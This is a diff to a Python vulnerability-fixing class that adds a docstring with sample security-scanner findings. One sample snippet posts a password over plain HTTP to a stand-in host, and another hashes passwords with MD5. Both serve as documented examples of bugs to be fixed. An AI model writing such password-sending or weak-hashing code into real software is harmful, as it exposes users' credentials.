@@ -48,10 +48,46 @@ class SecureFixProcessor:
         return False
 
     def fix_buggy_file(self, file_path: str, template_type: str, issues_data: Optional[List[Dict]] = None) -> FixResult:
+        """
+        issues_data generate: 
+        -> labeled_signals = self._normalize_labeled_signals(list_bugs)
+        -> list_real_bugs = analysis.get("list_bugs")
+        issues_data format:
+        {
+        "app.py": [
+            {
+            "key": "2e018b6e4219d525e9e9f6283d2d8403_0",
+            "label": "BUG",
+            "id": "python_lang_insecure_http",
+            "classification": "True Positive",
+            "reason": "The code uses HTTP instead of HTTPS. RAG: insecure HTTP connection",
+            "title": "Usage of insecure HTTP connection",
+            "lang": "python",
+            "file_name": "app.py",
+            "code_snippet": "        requests.post(\"http://example.com/collect\", json={\"pwd\": password})",
+            "line_number": "187",
+            "severity": "CRITICAL"
+            },
+            {
+            "key": "65c9c2496677f21552e48b34c59791e4_0",
+            "label": "BUG",
+            "id": "python_lang_weak_hash_md5",
+            "classification": "True Positive",
+            "reason": "The code uses MD5 for hashing, which is a weak hashing algorithm. RAG: weak hashing library (MDx)",
+            "title": "Usage of weak hashing library (MDx)",
+            "lang": "python",
+            "file_name": "app.py",
+            "code_snippet": "    pwd_hash = hashlib.md5(password.encode()).hexdigest()",
+            "line_number": "48",
+            "severity": "MEDIUM"
+            }
+        ]
+        }
+        """
         start = datetime.now()
         input_tokens = output_tokens = total_tokens = 0
         rag_context = self.rag.search_context(issues_data) or ""
-        logger.debug(f"Fixer RAG retrieved context: {rag_context[:50]}")
+        logger.debug(f"Fixer RAG retrieved context: {rag_context[:100]}")
         original = ""
         fixed_candidate = ""
         validation_errors = []
